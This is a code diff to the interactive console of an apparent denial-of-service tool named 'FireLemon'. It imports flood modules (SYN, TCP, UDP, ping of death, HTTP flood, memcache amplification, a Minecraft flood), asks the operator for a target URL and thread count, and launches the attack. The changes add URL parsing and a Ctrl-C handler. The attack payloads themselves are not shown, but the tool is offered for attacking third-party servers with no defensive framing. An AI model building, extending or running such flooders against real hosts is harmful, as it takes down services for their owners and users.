@@ -3,18 +3,18 @@ from scripts.layer_3.ping_of_death import PingOfDeath
 from scripts.layer_4.syn_flood import SynFlood
 from scripts.layer_4.tcp_flood import TCP
 from scripts.layer_4.udp_flood import UDP
-# from scripts.layer_4.Smurf import Smurf
-# from scripts.layer_4.smnp_flood import SmnpFlood
 from scripts.layer_4.minecraft import Minecraft
 from scripts.layer_7.http_flood import HttpAttack
 from scripts.layer_7.memcache import MemCache
-# from scripts.layer_7.cookie_stuffing import CookieStuffing
-# from scripts.layer_7.teardrop import Teardrop
+from url_handler import UrlHandler
 import shutil
 from rgbprint import gradient_print, Color, gradient_scroll, gradient_change
 from main import FireLemon
 from debug import Debug
 from colorama import *
+from threading import Thread
+import signal
+import sys
 import platform
 import os
 
@@ -434,12 +434,7 @@ def Console():
                     print(NOTE)
                     Print("\rHTTP attack mode Selected")
                     url_ = Print_input("Enter the URL: ")
-                    if url_.startswith("http://") or url_.startswith("https://"):
-                        url = url_     
-                    else:
-                        print(ERROR + "not defined url!")
-                        input("press any key to exit...")
-                        exit()
+                    url = UrlHandler(url_).url_handler()
                     threads = 50
                     threads_ = Print_input("Enter the number of threads(Default: 50): ")
                     if threads_ == "":
@@ -462,9 +457,9 @@ def Console():
                     print(Fore.WHITE + str(sleep))
                     Print_line()
                     print(WARN + "\n")
-                    input(Fore.MAGENTA + "Press Enter when you're ready!")
+                    input(Fore.MAGENTA + "Press Enter when you're ready!" + Fore.WHITE)
                     HttpAttack(url, int(threads), sleep).attack()
-                    print("done!")
+                    # print("done!")
                     exit()
 
                 elif attack_mode == "memcache" or attack_mode == "MEMCACHE" or attack_mode == "6":
@@ -504,9 +499,9 @@ def Console():
                     print(Fore.WHITE + str(sleep))
                     Print_line()
                     print(WARN + "\n")
-                    input(Fore.MAGENTA + "Press Enter when you're ready!")
+                    input(Fore.MAGENTA + "Press Enter when you're ready!" + Fore.WHITE + " ")
                     MemCache(url, int(threads), sleep).attack()
-                    print("done!")
+                    # print("done!")
                     exit()
 
             else:
@@ -521,6 +516,10 @@ def Console():
             Print_scroll("Thanks for using " + FireLemon.__name__ + ":3")
             exit()
 
+def exit_handler(sig, frame):
+    print(WARN + "Exiting...")
+    sys.exit(0)
+
 if platform.system().lower() == "windows":
     os.system("cls")
 
@@ -530,6 +529,8 @@ elif platform.system().lower() == "linux":
 else:
     os.system("clear")
 
+signal.signal(signal.SIGINT, exit_handler)
 Banner()
 TITLE()
 Console()
+signal.pause()
